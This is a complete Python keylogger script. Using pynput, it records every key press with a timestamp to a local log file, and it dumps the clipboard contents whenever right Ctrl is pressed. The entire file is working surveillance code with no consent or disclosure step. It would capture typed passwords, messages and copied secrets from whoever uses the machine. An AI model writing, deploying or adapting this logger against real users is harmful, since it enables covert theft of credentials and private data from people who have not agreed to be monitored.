import pyperclip
from pynput.keyboard import Listener
from datetime import datetime

KEYSTROKE_LOG_FILE = './log/keystroke.log'


def log_press_key(key):
    key = str(key).replace("'", "")
    line_to_write = None
    now = str(datetime.now())
    if key == 'Key.ctrl_r':
        line_to_write = f"{now} Clipboard - {pyperclip.paste()}"
    else:
        line_to_write = f"{now} Key Press - {key}"

    with open(KEYSTROKE_LOG_FILE, 'a') as f:
        f.write(f"{line_to_write}\n")


def start():
    with Listener(on_press=log_press_key) as l:
        l.join()


if __name__ == '__main__':
    start()
